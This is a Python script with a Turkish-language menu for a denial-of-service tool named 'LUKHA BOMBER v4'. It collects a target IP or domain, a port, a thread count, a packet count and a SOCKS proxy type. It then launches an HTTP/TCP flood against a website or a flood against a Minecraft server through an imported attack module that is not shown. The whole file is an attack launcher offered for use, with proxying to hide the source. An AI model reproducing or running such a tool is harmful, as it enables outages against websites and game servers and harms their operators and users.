import os
import sys
import time
import lukha

def install_requirements():
    print("\nGereksinimler yükleniyor...")
    os.system("pip install pysocks")
    print("Tamamlandı!")
    input("Devam etmek için Enter'a bas...")

def start_attack():
    target = input("Hedef IP/Domain: ").strip()
    port = int(input("Port (Site için 80, Minecraft için 25565 önerilir): ") or "80")
    threads = int(input("Thread sayısı (default 200): ") or "200")
    total_requests = int(input("Gönderilecek toplam paket sayısı: "))
    proxy_type = input("Proxy türü (socks4/socks5): ").strip().lower()
    if proxy_type not in ["socks4", "socks5"]:
        print("Geçersiz proxy tipi!")
        return
    print("Hedef türü seç:")
    print("1. Site (HTTP + TCP Flood)")
    print("2. Minecraft Sunucusu (Özel Flood)")
    choice = input("Seçiminiz (1 veya 2): ")
    if choice == "1":
        attack_target = "site"
    elif choice == "2":
        attack_target = "minecraft"
        if port == 80:
            port = 25565
    else:
        print("Geçersiz seçim!")
        return

    bomber = lukha.LukhaBomber(target, port, threads, total_requests, proxy_type, attack_target)
    bomber.start()

def main_menu():
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print("""
╔════════════════════════════╗
║        LUKHA BOMBER v4        ║
╠════════════════════════════╣
║ 1. DDoS Saldırısı Başlat      ║
║ 2. Gereksinimleri Yükle       ║
║ 3. Çıkış                      ║
╚════════════════════════════╝
""")
        choice = input("Seçiminiz (1-3): ")

        if choice == "1":
            start_attack()
            input("Ana menüye dönmek için Enter'a bas...")
        elif choice == "2":
            install_requirements()
        elif choice == "3":
            print("Çıkılıyor...")
            time.sleep(1)
            sys.exit()
        else:
            print("Geçersiz seçim!")
            time.sleep(1)

if __name__ == "__main__":
    main_menu()
